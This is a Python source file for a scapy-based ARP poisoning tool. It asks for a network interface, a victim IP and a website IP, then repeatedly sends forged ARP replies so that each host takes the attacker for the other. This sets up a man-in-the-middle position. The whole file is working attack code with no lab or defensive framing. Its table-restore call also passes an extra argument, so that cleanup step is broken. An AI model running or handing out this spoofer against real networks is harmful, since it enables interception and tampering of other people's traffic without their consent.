import scapy.all as scapy
import time

class ARPPoison:
    def __init__(self, iface, victimIP, websiteIP):
        self.iface = iface
        self.victimIP = victimIP
        self.websiteIP = websiteIP
    
    def get_mac(self, IP):
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=IP)
        pkt = scapy.srp(broadcast, iface=self.iface, timeout=2, verbose=False)[0]
        mac = pkt[0][1].hwsrc
        return mac
    
    def set_mac(self):
        self.victimMAC = self.get_mac(self.victimIP)
        self.websiteMAC = self.get_mac(self.websiteIP)
    
    def poison(self, target, pretend, MAC):
        # Note: Ignore warning when running, adding Ether 'hwdst' will break the poisoning
        packet = scapy.ARP(op=2, hwdst=MAC, pdst=target, psrc=pretend)
        scapy.send(packet, iface=self.iface)
        print(f"> Poisoning {target} as {pretend}")
    
    def restore_tables(self, ptarget1, ptarget2, hwt1, hwt2):
        pkt = scapy.ARP(op=2, pdst=ptarget1, hwdst=hwt1, psrc=ptarget2, hwsrc=hwt2)
        scapy.send(pkt, iface=self.iface)
        pkt = scapy.ARP(op=2, pdst=ptarget2, hwdst=hwt2, psrc=ptarget1, hwsrc=hwt1)
        scapy.send(pkt, iface=self.iface)
        print("> ARP tables restored. Exiting...")
        
    def attack(self):
        self.set_mac()
        try:
            while True:
                self.poison(self.victimIP, self.websiteIP, self.victimMAC)
                self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
                time.sleep(1.0)
        except KeyboardInterrupt:
            restore = input("> Restore ARP tables? [Y/N]")
            if restore == 'y' or restore == 'Y' or restore == 'yes' or restore == 'Yes' or restore == 'YES':
                self.restore_tables(self, self.victimIP, self.websiteIP, self.victimMAC, self.websiteMAC)
            else:
                print("> Exiting...")

if __name__ == "__main__":
    iface = input("> Interface: ")
    victim = input("> Victim IP: ")
    site = input("> Website IP: ")
    # Also implement timer (how often to send)

    spoofer = ARPPoison(iface, victim, site)
    spoofer.attack()